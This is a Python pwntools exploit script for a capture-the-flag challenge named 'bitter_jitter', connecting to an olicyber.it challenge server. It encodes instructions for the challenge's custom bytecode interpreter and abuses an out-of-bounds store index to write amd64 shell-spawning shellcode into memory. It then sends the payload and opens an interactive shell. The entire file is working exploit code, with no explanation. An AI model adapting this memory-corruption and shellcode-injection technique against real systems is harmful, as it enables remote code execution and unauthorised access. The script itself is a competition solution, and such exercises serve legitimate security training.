from pwn import *

r = remote("bitter-jitter.challs.olicyber.it", 38075)
#r = process("./bin/bitter_jitter")

shellcode = asm(shellcraft.amd64.sh(), arch='amd64')
payload = b""

R1  = 1
R2  = 2
R3  = 3
RDP = 4

def end():
    return bytes([12])

def nop():
    return bytes([11])

def ret():
    return bytes([10])

def call(pos_func):
    low  = pos_func & 0xFF
    high = (pos_func >> 8) & 0xFF
    return bytes([9, low, high])

def store_dp_idx(idx, reg_src):
    low  = idx & 0xFF
    high = (idx >> 8) & 0xFF
    return bytes([8, low, high, reg_src])

def store_dp(reg_src):
    return bytes([7, reg_src])

def load_dp_idx(idx, reg_dst):
    low  = idx & 0xFF
    high = (idx >> 8) & 0xFF
    return bytes([6, low, high, reg_dst])

def load_dp(reg_dst):
    return bytes([5, reg_dst])

def sub(reg, val):
    return bytes([1, reg, val & 0xFF, (val >> 8) & 0xFF])

def add(reg, val):
    return bytes([2, reg, val & 0xFF, (val >> 8) & 0xFF])

def xor(reg, val):
    return bytes([3, reg, val & 0xFF, (val >> 8) & 0xFF])

def mov(reg, val):
    return bytes([4, reg, val & 0xFF, (val >> 8) & 0xFF])


payload += call(19)
payload += call(19)
payload += call(19)
payload += call(19)
payload += call(19)
payload += call(19)
payload += end()

for i, byte in enumerate(shellcode):
    payload += mov(RDP, i+1)
    payload += mov(R1, byte)
    payload += store_dp_idx(0xFFFF, R1)
payload += ret()


r.recv(1000)
r.sendline(payload.hex().encode())
r.interactive()